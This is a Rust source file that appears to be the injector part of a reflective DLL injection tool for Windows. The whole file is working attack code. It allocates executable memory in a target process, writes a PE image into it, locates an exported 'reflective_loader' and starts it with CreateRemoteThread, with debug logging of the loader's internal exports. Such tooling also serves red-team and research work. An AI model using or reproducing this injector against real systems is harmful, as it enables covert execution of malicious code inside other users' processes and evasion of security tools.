use std::{ptr::null_mut};
use windows_sys::Win32::{System::{Threading::{IsWow64Process, CreateRemoteThread}, SystemServices::{IMAGE_DOS_HEADER}, Diagnostics::Debug::{IMAGE_NT_HEADERS64, WriteProcessMemory}, Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx}}, Foundation::{BOOL, CloseHandle}};

use crate::pe_utils::get_exports_by_name;

pub fn load_remote_library(process_handle: isize, module_base: usize) {
    let dos_header = module_base as *mut IMAGE_DOS_HEADER;
    log::debug!("[+] IMAGE_DOS_HEADER: {:?}", dos_header);

    #[cfg(target_arch = "x86")]
    let nt_headers = unsafe { (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS32 };
    #[cfg(target_arch = "x86_64")]
    let nt_headers = unsafe { (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64 };
    
    log::debug!("[+] IMAGE_NT_HEADERS: {:?}", nt_headers);

    // Check if image and target process are same architecture
    if !is_wow64(process_handle, module_base) {
        panic!("The target process and image are not the same architecture");
    }

    // Allocate memory in the target process for the image
    let remote_image = unsafe { 
        VirtualAllocEx(
            process_handle,
            null_mut(),
            (*nt_headers).OptionalHeader.SizeOfImage as usize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        )
    };
    
    log::debug!("[+] Allocated memory in the target process for the image: {:p}", remote_image);

    if remote_image.is_null() {
        panic!("Failed to allocate memory in the target process for the image");
    }

    // Write the image to the target process
    let wpm_result = unsafe {
        WriteProcessMemory(
            process_handle,
            remote_image as _,
            module_base as _,
            (*nt_headers).OptionalHeader.SizeOfImage as usize,
            null_mut(),
        )
    };

    if wpm_result == 0 {
        panic!("Failed to write the image to the target process");
    }

    let loader_address = get_exports_by_name(module_base as _, "reflective_loader".to_owned()).expect("Failed to find export");
    log::debug!("[+] Local Reflective Loader Address/offset: {:?}", loader_address);

    let reflective_loader = remote_image as usize + (loader_address as usize - module_base); // module_base minus to get the offset
    log::debug!("[+] Remote Reflective Loader Address/offset: {:#x}", reflective_loader);
    
    pause(); // used for debugging

    // Create remote thread and execute our shellcode
    let thread_handle = unsafe { 
        CreateRemoteThread(
        process_handle,
        null_mut(),
        0,
        Some(std::mem::transmute(reflective_loader as usize)),
        remote_image,
        0,
        null_mut(),
        )
    };

    if thread_handle == 0 {
        panic!("Failed to call CreateRemoteThread");
    }

    unsafe { CloseHandle(thread_handle); }

    log::debug!("[+] Injection Completed");

    // The following is used for debugging only.

    let get_peb_ldr = get_exports_by_name(module_base as _, "get_peb_ldr".to_owned()).expect("Failed to find export");
    log::debug!("[+] get_peb_ldr: {:#x}", remote_image as usize + (get_peb_ldr as usize - module_base));

    let set_exported_functions_by_name = get_exports_by_name(module_base as _, "set_exported_functions_by_name".to_owned()).expect("Failed to find export");
    log::debug!("[+] set_exported_functions_by_name: {:#x}", remote_image as usize + (set_exported_functions_by_name as usize - module_base));

    let get_module_exports = get_exports_by_name(module_base as _, "get_module_exports".to_owned()).expect("Failed to find export");
    log::debug!("[+] get_module_exports: {:#x}", remote_image as usize + (get_module_exports as usize - module_base));

    let get_loaded_modules_by_name = get_exports_by_name(module_base as _, "get_loaded_modules_by_name".to_owned()).expect("Failed to find export");
    log::debug!("[+] get_loaded_modules_by_name: {:#x}", remote_image as usize + (get_loaded_modules_by_name as usize - module_base));

    let copy_sections_to_local_process = get_exports_by_name(module_base as _, "copy_sections_to_local_process".to_owned()).expect("Failed to find export");
    log::debug!("[+] copy_sections_to_local_process: {:#x}", remote_image as usize + (copy_sections_to_local_process as usize - module_base));

    let rebase_image = get_exports_by_name(module_base as _, "rebase_image".to_owned()).expect("Failed to find export");
    log::debug!("[+] rebase_image: {:#x}", remote_image as usize + (rebase_image as usize - module_base));

    let resolve_imports = get_exports_by_name(module_base as _, "resolve_imports".to_owned()).expect("Failed to find export");
    log::debug!("[+] resolve_imports: {:#x}", remote_image as usize + (resolve_imports as usize - module_base));

    let entry_point = unsafe { (*nt_headers).OptionalHeader.AddressOfEntryPoint };
    log::debug!("[+] entry_point: {:#x}", remote_image as usize + entry_point as usize);
}


fn is_wow64(process_handle: isize, module_base: usize) -> bool {
    let dos_header = module_base as *mut IMAGE_DOS_HEADER;

    #[cfg(target_arch = "x86")]
    let nt_headers = unsafe { (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS32 };
    #[cfg(target_arch = "x86_64")]
    let nt_headers = unsafe { (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64 };

    // Check target and image arch
    let mut is_wow64_process: BOOL = 0;
    let mut is_wow64_image: BOOL = 0;
     
    // If the process is a 64-bit application running under 64-bit Windows, the value is also set to FALSE.
    if unsafe { IsWow64Process(process_handle, &mut is_wow64_process) == 0 } {
        panic!("Failed to call IsWow64Process");
    }
 
    if unsafe { (*nt_headers).OptionalHeader.Magic == 0x010B } { //PE32
        is_wow64_image = 1;
    } 
    else if unsafe { (*nt_headers).OptionalHeader.Magic == 0x020B } { // PE64
        is_wow64_image = 0;
    }

    if is_wow64_process != is_wow64_image {
        return false;
    }
    return true;
}


#[allow(dead_code)]
/// Gets user input from the terminal
fn get_input() -> std::io::Result<()> {
    let mut buf = String::new();
    std::io::stdin().read_line(&mut buf)?;
    Ok(())
}

#[allow(dead_code)]
/// Used for debugging
pub fn pause() {
    match get_input() {
        Ok(buffer) => println!("{:?}", buffer),
        Err(error) => println!("error: {}", error),
    };
}